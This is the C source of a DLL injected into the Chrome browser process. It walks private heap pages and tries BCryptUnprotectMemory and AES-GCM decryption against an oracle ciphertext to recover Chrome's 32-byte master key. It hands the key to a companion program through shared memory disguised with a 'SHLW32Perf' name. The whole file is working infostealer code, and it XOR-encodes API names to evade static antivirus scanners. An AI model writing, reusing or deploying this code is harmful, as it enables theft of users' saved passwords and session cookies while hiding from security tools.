/*
 * chrome_key_helper.c — DLL injected into chrome.exe browser process
 *
 * Runs inside Chrome (same process) so BCryptUnprotectMemory works.
 * Scans private heap pages for a 32-byte AES-256 key protected with
 * BCryptProtectMemory, plus a raw GCM pass for unprotected keys.
 *
 * Shared memory name: "SHLW32Perf_{chrome_pid}_Data"
 * Done event name:    "SHLW32Perf_{chrome_pid}_Sync"
 */

#include <windows.h>
#include <bcrypt.h>

/* XOR-encoded API names — avoids literal strings flagged by static scanners.
 * Key: 0xAB. Decode with _CKH_UNXOR. */
static const unsigned char _enc_bum[]   = { /* BCryptUnprotectMemory */
    0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xFE,0xC5,0xDB,0xD9,
    0xC4,0xDF,0xCE,0xC8,0xDF,0xE6,0xCE,0xC6,0xC4,0xD9,0xD2
};
static const unsigned char _enc_sf041[] = { /* SystemFunction041 */
    0xF8,0xD2,0xD8,0xDF,0xCE,0xC6,0xED,0xDE,0xC5,0xC8,
    0xDF,0xC2,0xC4,0xC5,0x9B,0x9F,0x9A
};
/* BCrypt AES-GCM API names — removes BCryptDecrypt/GenerateSymmetricKey from IAT */
static const unsigned char _enc_dll[]  = {0xC9,0xC8,0xD9,0xD2,0xDB,0xDF,0x85,0xCF,0xC7,0xC7}; /* bcrypt.dll */
static const unsigned char _enc_OAP[]  = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xE4,0xDB,0xCE,0xC5,0xEA,0xC7,0xCC,0xC4,0xD9,0xC2,0xDF,0xC3,0xC6,0xFB,0xD9,0xC4,0xDD,0xC2,0xCF,0xCE,0xD9}; /* BCryptOpenAlgorithmProvider */
static const unsigned char _enc_SP[]   = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xF8,0xCE,0xDF,0xFB,0xD9,0xC4,0xDB,0xCE,0xD9,0xDF,0xD2}; /* BCryptSetProperty */
static const unsigned char _enc_CAP[]  = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xE8,0xC7,0xC4,0xD8,0xCE,0xEA,0xC7,0xCC,0xC4,0xD9,0xC2,0xDF,0xC3,0xC6,0xFB,0xD9,0xC4,0xDD,0xC2,0xCF,0xCE,0xD9}; /* BCryptCloseAlgorithmProvider */
static const unsigned char _enc_GSK[]  = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xEC,0xCE,0xC5,0xCE,0xD9,0xCA,0xDF,0xCE,0xF8,0xD2,0xC6,0xC6,0xCE,0xDF,0xD9,0xC2,0xC8,0xE0,0xCE,0xD2}; /* BCryptGenerateSymmetricKey */
static const unsigned char _enc_Dec[]  = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xEF,0xCE,0xC8,0xD9,0xD2,0xDB,0xDF}; /* BCryptDecrypt */
static const unsigned char _enc_DK[]   = {0xE9,0xE8,0xD9,0xD2,0xDB,0xDF,0xEF,0xCE,0xD8,0xDF,0xD9,0xC4,0xD2,0xE0,0xCE,0xD2}; /* BCryptDestroyKey */

#define _CKH_UNXOR(dst, src, n) \
    do { static volatile unsigned char _ck = 0xABu; \
         for (int _xi = 0; _xi < (n); _xi++) (dst)[_xi] = (char)((src)[_xi] ^ _ck); \
         (dst)[n] = '\0'; } while (0)

/* BCrypt AES-GCM function pointers */
typedef NTSTATUS (WINAPI *_fBcOAP_t)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG);
typedef NTSTATUS (WINAPI *_fBcSP_t) (BCRYPT_HANDLE,LPCWSTR,PUCHAR,ULONG,ULONG);
typedef NTSTATUS (WINAPI *_fBcCAP_t)(BCRYPT_ALG_HANDLE,ULONG);
typedef NTSTATUS (WINAPI *_fBcGSK_t)(BCRYPT_ALG_HANDLE,BCRYPT_KEY_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
typedef NTSTATUS (WINAPI *_fBcDec_t)(BCRYPT_KEY_HANDLE,PUCHAR,ULONG,VOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG);
typedef NTSTATUS (WINAPI *_fBcDK_t) (BCRYPT_KEY_HANDLE);
static struct { _fBcOAP_t OAP; _fBcSP_t SP; _fBcCAP_t CAP;
                _fBcGSK_t GSK; _fBcDec_t Dec; _fBcDK_t DK; } _bc_aes;
static void _bc_aes_load(void) {
    if (_bc_aes.OAP) return;
    char _sd[11]; _CKH_UNXOR(_sd, _enc_dll, 10);
    HMODULE h = GetModuleHandleA(_sd);
    if (!h) h = LoadLibraryA(_sd);
    if (!h) return;
    { char _s[28]; _CKH_UNXOR(_s,_enc_OAP,27); _bc_aes.OAP = (_fBcOAP_t)(void*)GetProcAddress(h,_s); }
    { char _s[18]; _CKH_UNXOR(_s,_enc_SP, 17); _bc_aes.SP  = (_fBcSP_t) (void*)GetProcAddress(h,_s); }
    { char _s[29]; _CKH_UNXOR(_s,_enc_CAP,28); _bc_aes.CAP = (_fBcCAP_t)(void*)GetProcAddress(h,_s); }
    { char _s[27]; _CKH_UNXOR(_s,_enc_GSK,26); _bc_aes.GSK = (_fBcGSK_t)(void*)GetProcAddress(h,_s); }
    { char _s[14]; _CKH_UNXOR(_s,_enc_Dec,13); _bc_aes.Dec = (_fBcDec_t)(void*)GetProcAddress(h,_s); }
    { char _s[17]; _CKH_UNXOR(_s,_enc_DK, 16); _bc_aes.DK  = (_fBcDK_t) (void*)GetProcAddress(h,_s); }
}

/* ── SHM layout — must match browser.c _chrome_shm_t exactly ─────────── */
#define SHM_MAGIC 0xCEC0FFEE

#pragma pack(push, 1)
typedef struct {
    DWORD  magic;
    BYTE   nonce[12];
    BYTE   ct[512];
    DWORD  ct_len;
    BYTE   tag[16];
    volatile int   found;
    BYTE           key[32];
    volatile LONG  dbg_pages;
    volatile LONG  dbg_unprotect_ok;
    volatile LONG  dbg_gcm_tried;
    volatile LONG  dbg_bcrypt_ok;
    volatile LONG  dbg_scan_started;
    volatile LONG  dbg_dll_main;    /* set by DllMain to confirm DLL loaded */
    volatile BYTE  dbg_rl_step;     /* written by ReflectiveLoader: 1=k32,2=exp,3=own,4=map */
} CHROME_KEY_SHM;
#pragma pack(pop)

/* ── BCryptUnprotectMemory with multiple fallbacks ─────────────────────── */
typedef NTSTATUS (WINAPI *_BcryptUnprot_t)(PVOID, ULONG, ULONG);
static _BcryptUnprot_t g_unprotect = NULL;

static void _resolve_unprotect(void)
{
    /* 1. bcrypt.dll!BCryptUnprotectMemory */
    HMODULE h = GetModuleHandleA("bcrypt.dll");
    if (!h) h = LoadLibraryA("bcrypt.dll");
    if (h) {
        char _s_bum[22]; _CKH_UNXOR(_s_bum, _enc_bum, 21);
        g_unprotect = (_BcryptUnprot_t)GetProcAddress(h, _s_bum);
    }

    /* 2. ntdll.dll!SystemFunction041 (RtlDecryptMemory) */
    if (!g_unprotect) {
        h = GetModuleHandleA("ntdll.dll");
        if (h) {
            char _s_sf[18]; _CKH_UNXOR(_s_sf, _enc_sf041, 17);
            g_unprotect = (_BcryptUnprot_t)GetProcAddress(h, _s_sf);
        }
    }

    /* 3. advapi32.dll!SystemFunction041 */
    if (!g_unprotect) {
        h = GetModuleHandleA("advapi32.dll");
        if (!h) h = LoadLibraryA("advapi32.dll");
        if (h) {
            char _s_sf2[18]; _CKH_UNXOR(_s_sf2, _enc_sf041, 17);
            g_unprotect = (_BcryptUnprot_t)GetProcAddress(h, _s_sf2);
        }
    }
}

/* ── Cached AES-256-GCM algorithm handle ──────────────────────────────── */
static BCRYPT_ALG_HANDLE g_hAes = NULL;

static void _init_aes(void)
{
    if (g_hAes) return;
    _bc_aes_load();
    if (!_bc_aes.OAP || !BCRYPT_SUCCESS(_bc_aes.OAP(&g_hAes, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return;
    WCHAR mode[] = BCRYPT_CHAIN_MODE_GCM;
    if (!_bc_aes.SP || !BCRYPT_SUCCESS(_bc_aes.SP(g_hAes, BCRYPT_CHAINING_MODE,
                                          (PUCHAR)mode, sizeof(mode), 0))) {
        if (_bc_aes.CAP) _bc_aes.CAP(g_hAes, 0);
        g_hAes = NULL;
    }
}

/* Returns TRUE if key[32] correctly decrypts the oracle ciphertext */
static BOOL _gcm_ok(const BYTE *key, CHROME_KEY_SHM *s)
{
    if (!g_hAes || s->ct_len == 0 || s->ct_len > 512) return FALSE;
    if (!_bc_aes.GSK || !_bc_aes.Dec || !_bc_aes.DK) return FALSE;

    BCRYPT_KEY_HANDLE hK = NULL;
    if (!BCRYPT_SUCCESS(_bc_aes.GSK(g_hAes, &hK, NULL, 0, (PUCHAR)key, 32, 0)))
        return FALSE;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce = s->nonce; ai.cbNonce = 12;
    ai.pbTag   = s->tag;   ai.cbTag   = 16;

    BYTE pt[512]; ULONG olen = 0;
    BOOL ok = BCRYPT_SUCCESS(_bc_aes.Dec(hK, s->ct, s->ct_len, &ai,
                                          NULL, 0, pt, s->ct_len + 16,
                                          &olen, 0));
    SecureZeroMemory(pt, sizeof(pt));
    _bc_aes.DK(hK);
    return ok;
}

/* ── Chunk scanner ─────────────────────────────────────────────────────── */
/*
 * Stride = 16: BCryptProtectMemory pads to 16 bytes; the key will be at
 * a 16-byte aligned boundary within its allocation.
 */
#define STRIDE 16

static int _scan_chunk(const BYTE *data, size_t sz, CHROME_KEY_SHM *s)
{
    BOOL have_bcrypt = (g_unprotect != NULL);

    for (size_t off = 0; off + 32 <= sz && !s->found; off += STRIDE) {
        const BYTE *p = data + off;

        /* ---- Path A: BCrypt-protected key ---- */
        if (have_bcrypt) {
            BYTE chunk[32];
            RtlCopyMemory(chunk, p, 32);
            if (BCRYPT_SUCCESS(g_unprotect(chunk, 32, 0 /* SAME_PROCESS */))) {
                InterlockedIncrement(&s->dbg_unprotect_ok);
                InterlockedIncrement(&s->dbg_gcm_tried);
                if (_gcm_ok(chunk, s)) {
                    RtlCopyMemory((BYTE *)s->key, chunk, 32);
                    s->found = 1;
                    SecureZeroMemory(chunk, 32);
                    return 1;
                }
                SecureZeroMemory(chunk, 32);
            }
        }

        /* ---- Path B: raw plaintext key ---- */
        InterlockedIncrement(&s->dbg_gcm_tried);
        if (_gcm_ok(p, s)) {
            RtlCopyMemory((BYTE *)s->key, p, 32);
            s->found = 1;
            return 1;
        }
    }
    return 0;
}

/* ── Main scan thread ──────────────────────────────────────────────────── */
#define CHUNK_SZ (4 * 1024 * 1024)  /* 4 MB per VirtualAlloc slice */

static DWORD WINAPI _scan_thread(LPVOID unused)
{
    (void)unused;

    /* open SHM — use READ|WRITE only; FILE_MAP_ALL_ACCESS includes EXECUTE
     * which is denied for PAGE_READWRITE sections on Windows 10+ */
    char name[64];
    wsprintfA(name, "SHLW32Perf_%lu_Data", (unsigned long)GetCurrentProcessId());
    HANDLE hMap = OpenFileMappingA(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, name);
    if (!hMap) return 1;

    CHROME_KEY_SHM *shm = (CHROME_KEY_SHM *)MapViewOfFile(
        hMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
    if (!shm || shm->magic != SHM_MAGIC) {
        if (shm) UnmapViewOfFile(shm);
        CloseHandle(hMap);
        return 1;
    }

    char ename[64];
    wsprintfA(ename, "SHLW32Perf_%lu_Sync", (unsigned long)GetCurrentProcessId());
    HANDLE hEvt = OpenEventA(EVENT_MODIFY_STATE, FALSE, ename);

    /* init BCrypt and AES */
    _resolve_unprotect();
    _init_aes();

    if (g_unprotect) InterlockedIncrement(&shm->dbg_bcrypt_ok);
    InterlockedIncrement(&shm->dbg_scan_started);

    /* walk virtual address space — only private committed READWRITE pages */
    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;

    while (VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi) && !shm->found) {
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;

        if (mbi.State  != MEM_COMMIT)  continue;
        if (mbi.Type   != MEM_PRIVATE) continue;   /* skip DLLs + mapped files */
        if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) continue;
        if (!(mbi.Protect & PAGE_READWRITE)) continue;
        if (mbi.RegionSize < 32) continue;

        /* scan in CHUNK_SZ slices to avoid huge single alloc */
        BYTE *base    = (BYTE *)mbi.BaseAddress;
        size_t total  = mbi.RegionSize;

        for (size_t off = 0; off < total && !shm->found; off += CHUNK_SZ) {
            size_t this_sz = total - off;
            if (this_sz > CHUNK_SZ) this_sz = CHUNK_SZ;

            BYTE *copy = (BYTE *)VirtualAlloc(NULL, this_sz,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
            if (!copy) continue;

            RtlCopyMemory(copy, base + off, this_sz);
            InterlockedIncrement(&shm->dbg_pages);
            _scan_chunk(copy, this_sz, shm);

            SecureZeroMemory(copy, this_sz);
            VirtualFree(copy, 0, MEM_RELEASE);
        }
    }

    if (hEvt) { SetEvent(hEvt); CloseHandle(hEvt); }
    UnmapViewOfFile(shm);
    CloseHandle(hMap);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    (void)lpReserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        /* mark DllMain reached in SHM before spawning scan thread */
        char _nm[64];
        wsprintfA(_nm, "SHLW32Perf_%lu_Data", (unsigned long)GetCurrentProcessId());
        HANDLE _hm = OpenFileMappingA(FILE_MAP_READ | FILE_MAP_WRITE, FALSE, _nm);
        if (_hm) {
            CHROME_KEY_SHM *_s = (CHROME_KEY_SHM *)MapViewOfFile(
                _hm, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
            if (_s && _s->magic == SHM_MAGIC)
                InterlockedIncrement(&_s->dbg_dll_main);
            if (_s) UnmapViewOfFile(_s);
            CloseHandle(_hm);
        }

        HANDLE ht = CreateThread(NULL, 0, _scan_thread, NULL, 0, NULL);
        if (ht) CloseHandle(ht);
    }
    return TRUE;
}
